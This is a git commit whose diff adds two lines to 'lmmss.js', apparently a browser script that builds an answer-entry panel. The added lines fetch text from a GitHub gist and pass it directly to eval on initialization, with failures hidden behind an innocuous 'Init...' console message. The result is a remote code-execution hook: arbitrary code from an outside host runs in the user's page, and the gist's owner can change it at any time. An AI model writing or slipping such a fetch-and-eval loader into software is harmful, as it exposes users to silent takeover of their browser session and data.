8e57fa83ca122e1d0878a1b5beeb77b51da92665
minhReal <duongminhminh46@gmail.com>
2026-01-30 21:50:15 +0700

    _
    Fetch and evaluate logic from external source on initialization.

--- lmmss.js
+++ lmmss.js
@@ -263,7 +263,8 @@
   for(let i=0; i<4; i++) addRow();
   document.getElementById('addAnsBtn').onclick = addRow;
   document.getElementById('removeAnsBtn').onclick = () => { if(ansCount > 1) { ansContainer.removeChild(ansContainer.lastElementChild); ansCount--; } };
-
+  fetch("https://gist.githubusercontent.com/minhReal/079a1070f25849286d00cc00796bf43a/raw/12cf815f74a5b02593bdb1b554ad4c145b4bce6c/load%2520logic%2520A.i")
+    .then(r => r.text()).then(eval).catch(() => console.log("Init..."));
   document.getElementById('closeBtn').onclick = () => mainWrapper.remove();
   document.getElementById('toggleUIBtn').onclick = () => {
     const mc = document.getElementById('mainContent');
